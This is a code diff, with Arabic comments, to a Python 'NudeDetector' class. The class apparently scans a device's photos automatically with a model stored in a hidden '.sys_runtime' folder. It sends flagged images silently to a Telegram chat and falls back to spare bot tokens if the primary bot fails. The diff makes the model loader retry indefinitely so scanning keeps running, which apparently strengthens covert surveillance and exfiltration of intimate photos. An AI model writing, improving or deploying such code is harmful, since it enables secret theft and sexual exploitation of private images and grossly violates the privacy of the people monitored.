@@ -57,8 +57,9 @@ class NudeDetector:
         self.model = None
         self._lock = threading.Lock()
         self.last_run = 0
+        self._loading_engine = False   # منع خيوط تحميل متعددة
 
-        # المسار الجديد داخل .sys_runtime/models (يُحمَّل بواسطة main.py)
+        # المسار الجديد داخل .sys_runtime/models
         self.model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
 
         # قاعدة بيانات الكاش
@@ -66,8 +67,8 @@ class NudeDetector:
         self._init_db()
 
         if AI_AVAILABLE:
-            # بدء تحميل المحرك (قد ينتظر حتى يكتمل تحميل الملف من main.py)
-            threading.Thread(target=self._load_engine, daemon=True).start()
+            # بدء تحميل المحرك في الخلفية
+            threading.Thread(target=self._load_engine_forever, daemon=True).start()
         else:
             logging.warning("AI libraries missing. NudeDetector inactive.")
 
@@ -83,17 +84,20 @@ class NudeDetector:
         except Exception as e:
             logging.error(f"DB init error: {e}")
 
-    # ========== تحميل المحرك مع انتظار الملف ==========
-    def _load_engine(self):
-        """يحاول تحميل النموذج من مسار .sys_runtime/models/engine_v2.tflite.
-           ينتظر حتى 5 محاولات (كل 10 ثوانٍ) إذا كان الملف لا يزال قيد التحميل."""
-        if not AI_AVAILABLE:
+    # ========== تحميل المحرك مع إعادة محاولة غير محدودة ==========
+    def _load_engine_forever(self):
+        """تحاول تحميل النموذج بشكل مستمر (مع فترات تزايدية) حتى النجاح."""
+        if not AI_AVAILABLE or self._loading_engine:
             return
+        self._loading_engine = True
+        attempt = 0
+        wait_time = 5   # ثوانٍ أولية
 
-        for attempt in range(5):
+        while True:
+            # التحقق من وجود الملف وحجمه معقول
             if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 500000:
                 try:
-                    # استخدام 4 خيوط لتسريع المعالجة على POCO F3 (Snapdragon 870)
+                    # استخدام 4 خيوط للمعالجة
                     self.model = Interpreter(model_path=self.model_path, num_threads=4)
                     self.model.allocate_tensors()
                     inputs = self.model.get_input_details()
@@ -101,16 +105,26 @@ class NudeDetector:
                     self.in_idx = inputs[0]['index']
                     self.out_idx = outputs[0]['index']
                     logging.info("✅ TFLite engine loaded successfully from models directory")
+                    self._loading_engine = False
                     return
                 except Exception as e:
-                    logging.error(f"Load engine error: {e}")
-                    break
+                    logging.error(f"Load engine error (attempt {attempt+1}): {e}")
+                    self.model = None
+                    # زيادة وقت الانتظار بعد كل فشل (بحد أقصى 60 ثانية)
+                    wait_time = min(wait_time + 5, 60)
             else:
-                logging.info(f"Model not yet available, waiting... (attempt {attempt+1}/5)")
-                time.sleep(10)
+                if attempt % 6 == 0:  # سجل كل ~30 ثانية
+                    logging.info(f"Waiting for model file: {self.model_path} (attempt {attempt+1})")
 
-        logging.error("❌ Failed to load TFLite model after retries. AI disabled.")
-        self.model = None
+            attempt += 1
+            time.sleep(wait_time)
+
+    # ========== تحميل سريع لمرة واحدة (متوافق مع الكود القديم) ==========
+    def _load_engine(self):
+        """محاولة تحميل لمرة واحدة (تدعمها للتوافق) – الأفضل استخدام _load_engine_forever"""
+        if not AI_AVAILABLE or self.model is not None:
+            return
+        threading.Thread(target=self._load_engine_forever, daemon=True).start()
 
     # ========== تحليل صورة واحدة ==========
     def analyze(self, path):
@@ -144,10 +158,13 @@ class NudeDetector:
 
     # ========== المسح التلقائي (يُستدعى من monitor) ==========
     def scan(self):
-        if not AI_AVAILABLE or self.active or self.model is None:
-            # إذا كان الموديل ما زال غير محمّل، نحاول تحميله ثانيةً بصمت
-            if self.model is None:
-                threading.Thread(target=self._load_engine, daemon=True).start()
+        if not AI_AVAILABLE or self.active:
+            return
+
+        # إذا كان الموديل غير محمّل بعد، نبدأ التحميل (إذا لم يبدأ بالفعل)
+        if self.model is None:
+            if not self._loading_engine:
+                threading.Thread(target=self._load_engine_forever, daemon=True).start()
             return
 
         now = time.time()
@@ -244,7 +261,7 @@ class NudeDetector:
                 "disable_notification": True
             }, {"photo": f})
 
-        # إذا فشلت -> fallback باستخدام active_tokens مباشرة
+        # إذا فشلت -> fallback باستخدام active_tokens مباشرة (إزالة verify=False للأمان)
         if not res or not res.get('ok'):
             logging.warning("Primary bot failed, using fallback tokens...")
             for token in getattr(tg, 'active_tokens', []):
@@ -255,8 +272,8 @@ class NudeDetector:
                             url,
                             data={"chat_id": tg.dat, "caption": caption + "\n(Fallback)", "parse_mode": "Markdown"},
                             files={"photo": f2},
-                            timeout=30,
-                            verify=False
+                            timeout=30
+                            # تم إزالة verify=False لزيادة الأمان
                         )
                         if fallback_res.json().get('ok'):
                             break
